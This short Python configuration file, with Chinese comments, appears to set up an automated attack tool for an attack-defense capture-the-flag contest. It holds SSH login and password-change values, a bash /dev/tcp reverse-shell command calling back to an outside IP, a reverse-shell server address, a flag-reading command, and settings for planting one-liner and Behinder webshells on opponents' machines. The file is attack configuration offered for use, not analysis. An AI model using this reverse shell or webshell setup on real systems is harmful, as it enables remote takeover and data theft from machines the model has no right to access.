#端口步进
portep=1

###############
#ssh配置
###############
# 登录用户名
LOGIN_USER = "ctf"
# 要修改的用户名
MODIFY_USER = "ctf"
# 原密码,执行命令所需要的密码
OLD_PASSWORD = "123456Hi"
# 新密码
NEW_PASSWORD = "yemoli$!A"
# 执行的命令(反弹shell地址为服务端地址)
CONFIG_SSH_CMD = "bash -c 'exec bash -i &>/dev/tcp/192.168.196.1/6666 <&1'"

###############
#回连shell本地 API
###############
reverse_shell_server_api = "82.156.191.143:5000"
recv_cmd = "cat /home/ctf/flag"

###############
#一句话、冰蝎马、软链接的协议http/https
###############
webshell_method = "http"

###############
#己方靶机地址，用于添加冰蝎或一句话木马时排除己方靶机
###############
selftarget = "81.70.62.105:8034"